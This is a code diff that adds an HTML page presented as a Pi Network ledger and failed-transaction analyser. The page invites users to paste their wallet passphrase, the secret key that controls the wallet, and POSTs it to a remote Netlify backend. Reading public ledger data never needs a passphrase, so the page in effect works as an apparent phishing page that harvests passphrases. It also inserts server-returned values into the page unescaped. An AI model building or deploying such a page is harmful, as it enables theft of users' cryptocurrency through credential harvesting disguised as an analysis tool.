@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network Complete On-Chain Ledger Parser</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
+        body { background-color: #f3f4f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
+        .analyzer-container { background-color: #ffffff; width: 100%; max-width: 950px; border-radius: 14px; box-shadow: 0 4px 25px rgba(0, 0, 0, 0.06); border: 1px solid #e5e7eb; padding: 24px; }
+        .header-title { font-size: 20px; color: #1e3a8a; font-weight: 700; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; text-align: center; border-bottom: 2px solid #f3f4f6; padding-bottom: 12px; }
+        .input-section { margin-top: 20px; margin-bottom: 20px; }
+        .input-label { display: block; font-size: 11px; font-weight: 700; color: #4b5563; text-transform: uppercase; margin-bottom: 6px; letter-spacing: 0.5px; }
+        .passphrase-input { width: 100%; padding: 14px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 14px; font-family: monospace; margin-bottom: 12px; }
+        .analyze-btn { width: 100%; background-color: #2563eb; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; }
+        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; text-align: center; margin-top: 20px; background-color: #f9fafb; border: 1px solid #e5e7eb; border-radius: 10px; padding: 16px; }
+        .stat-box h2 { font-size: 24px; font-weight: 700; color: #111827; }
+        .stat-box.failed-box h2 { color: #dc2626; }
+        .stat-box p { font-size: 10px; color: #6b7280; text-transform: uppercase; font-weight: 600; margin-top: 4px; }
+        .table-container { overflow-x: auto; margin-top: 24px; max-height: 480px; border: 1px solid #e5e7eb; border-radius: 8px; }
+        table { width: 100%; border-collapse: collapse; font-size: 12px; }
+        th { color: #374151; font-weight: 600; text-transform: uppercase; font-size: 10px; padding: 14px 10px; border-bottom: 2px solid #e5e7eb; position: sticky; top: 0; background: #f9fafb; z-index: 2; }
+        td { padding: 12px 10px; border-bottom: 1px solid #f3f4f6; color: #1f2937; }
+        .address-col { font-family: monospace; color: #2563eb; font-weight: 500; }
+        .center-text { text-align: center; }
+        .bold-text { font-weight: 700; }
+        .success-cell { background-color: #dcfce7; color: #15803d; font-weight: 700; border-radius: 4px; padding: 2px 8px; display: inline-block; }
+        .failed-text { color: #dc2626; font-weight: 700; }
+        .status-bar { font-size: 11px; color: #6b7280; margin-top: 14px; text-align: center; font-weight: 500; }
+    </style>
+</head>
+<body>
+
+<div class="analyzer-container">
+    <div class="header-title">Pi Network Live Ledger & Failed TX Parser</div>
+    
+    <div class="input-section">
+        <label class="input-label">Enter Pi Wallet Passphrase or Public Address (G...)</label>
+        <input type="text" id="walletInput" class="passphrase-input" placeholder="Paste your Passphrase OR complete 56-character Public Address here...">
+        <button class="analyze-btn" onclick="startNetlifyAnalysis()">Analyze Real Blockchain Logs</button>
+    </div>
+
+    <div class="stats-grid">
+        <div class="stat-box"> <h2 id="lblReceivers">0</h2> <p>Total Addresses</p> </div>
+        <div class="stat-box"> <h2 id="lblTotal">0</h2> <p>Total Scanned</p> </div>
+        <div class="stat-box"> <h2 id="lblSuccess" style="color: #16a34a;">0</h2> <p>Successful</p> </div>
+        <div class="stat-box failed-box"> <h2 id="lblFailed">0</h2> <p>Failed Attempts</p> </div>
+    </div>
+
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th style="width: 5%;">#</th>
+                    <th style="width: 45%;">Interacting Address (Sender/Receiver)</th>
+                    <th style="width: 12%; text-align: center;">Total TX</th>
+                    <th style="width: 12%; text-align: center;">Successful</th>
+                    <th style="width: 12%; text-align: center;">Failed</th>
+                    <th style="width: 14%; text-align: right;">Max Fee</th>
+                </tr>
+            </thead>
+            <tbody id="tableBody">
+                <tr><td colspan="6" style="text-align: center; color: #9ca3af; padding: 35px;">Input configuration parameters and run query loop.</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="status-bar" id="statusBar">System Status: Awaiting Action</div>
+</div>
+
+<script>
+// Netlify functions mapping endpoint rule
+const BACKEND_URL = "/.netlify/functions/server";
+
+async function startNetlifyAnalysis() {
+    const inputVal = document.getElementById('walletInput').value.trim();
+    const tableBody = document.getElementById('tableBody');
+    const statusBar = document.getElementById('statusBar');
+
+    if (!inputVal) { alert("Pehle target input dalo!"); return; }
+
+    tableBody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: #2563eb; padding: 25px; font-weight: 500;">Connecting to Netlify Serverless Backend Pipeline...</td></tr>`;
+    statusBar.innerText = "Status: Fetching logs remotely...";
+
+    try {
+        const response = await fetch(BACKEND_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ input: inputVal })
+        });
+
+        const result = await response.json();
+        if (!response.ok) {
+            tableBody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: #dc2626; font-weight: bold; padding: 20px;">${result.error}</td></tr>`;
+            statusBar.innerText = "Status: Process Stopped.";
+            return;
+        }
+
+        if (result.rows.length === 0) {
+            tableBody.innerHTML = `<tr><td colspan="6" style="text-align: center; padding: 20px;">No operational log records found for this slot.</td></tr>`;
+            statusBar.innerText = "Status: Output Empty.";
+            return;
+        }
+
+        document.getElementById('lblReceivers').innerText = result.rows.length;
+        document.getElementById('lblTotal').innerText = result.globalStats.total;
+        document.getElementById('lblSuccess').innerText = result.globalStats.success;
+        document.getElementById('lblFailed').innerText = result.globalStats.failed;
+
+        tableBody.innerHTML = "";
+        result.rows.forEach((row, idx) => {
+            let shortenedAddr = row.address.substring(0, 8) + "..." + row.address.substring(row.address.length - 8);
+            tableBody.innerHTML += `
+                <tr>
+                    <td>${idx + 1}</td>
+                    <td class="address-col" title="${row.address}">${shortenedAddr}</td>
+                    <td class="center-text bold-text">${row.total}</td>
+                    <td class="center-text">${row.success > 0 ? `<span class="success-cell">${row.success}</span>` : '-'}</td>
+                    <td class="center-text failed-text">${row.failed > 0 ? row.failed : '-'}</td>
+                    <td style="text-align: right; font-family: monospace;">${row.maxFee} Pi</td>
+                </tr>`;
+        });
+
+        statusBar.innerText = "Status: Real data analysis completed successfully.";
+
+    } catch (err) {
+        console.error(err);
+        tableBody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: #dc2626; padding: 20px;">Server connection error. Make sure netlify deployment is finished.</td></tr>`;
+    }
+}
+</script>
+</body>
+</html>
